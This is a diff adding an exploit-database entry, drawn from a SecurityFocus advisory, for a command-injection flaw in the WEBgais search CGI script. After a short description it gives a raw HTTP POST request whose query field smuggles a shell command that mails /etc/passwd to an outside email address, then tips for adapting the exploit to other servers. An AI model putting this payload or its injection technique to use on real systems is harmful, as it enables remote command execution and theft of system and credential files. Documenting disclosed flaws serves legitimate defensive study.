@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/2058/info
+
+WEBgais is a script that provides a web interface to the "gais" (Global Area Intelligent Search) search engine tool. All versions up to 1.0B2 are vulnerable. The vulnerable script is /cgi-bin/webgais: due to improper input checking it allows a remote attacker to execute commands at the privilege level of the web server. A specifically formatted query allows the vulnerable code to be executed; this query must include the parameters output=subject and domain=paragraph. These two parameters must be included, otherwise the vulnerable code is not executed. The problem lies in an improperly protected Perl "system" command that can be circumvented by encapsulating the malicious command in single quotes and using the unix shell command separation metacharacter ";". See exploit for an example. 
+
+telnet target.host 80
+POST /cgi-bin/webgais HTTP/1.0
+Content-length: 85 (replace this with the actual length of the "exploit" line)
+
+query=';mail+drazvan\@pop3.kappa.ro</etc/passwd;echo'&output=subject&domain=paragraph
+
+[...] But to make it work for your system too, you'll have to add other parameters, like idx_dir and data_type who are required by the script in its original version. Just make a normal query to your WebGais server and see what all the parameters are. But remember to use "output" and "domain" as specified in my exploit. Otherwise you will end up in some other place of the script and nothing will happen. 
